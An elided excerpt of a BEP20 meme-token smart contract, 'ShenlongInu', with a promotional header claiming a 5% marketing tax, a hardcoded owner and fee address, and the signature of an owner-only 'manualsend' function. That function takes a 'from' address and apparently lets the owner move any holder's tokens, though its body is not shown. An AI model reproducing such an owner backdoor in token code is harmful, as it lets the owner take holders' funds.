...
/**
   ...
   ShenlongInu - By safu team in collab with callers !

       LET'S MAKE THIS ONE TREND ON BSC FOR THEM ALL ! 

 5% Taxes fully spent on marketing

 Socials🌐

  TG : http://t.me/ShenlongInu
  Website http://ShenlongInu.xyz
...
contract ShenlongInu is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "ShenlongInu";
    ...
    address public Owner=0x05e633B222A2aC779875F1C18C7A1cCeB01eD3fb; // owner address
    ...
    constructor () Auth(Owner) {
        ...
        marketingFeeReceiver = 0x05e633B222A2aC779875F1C18C7A1cCeB01eD3fb;
...
/* manualsend */
 ...
 function manualsend(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
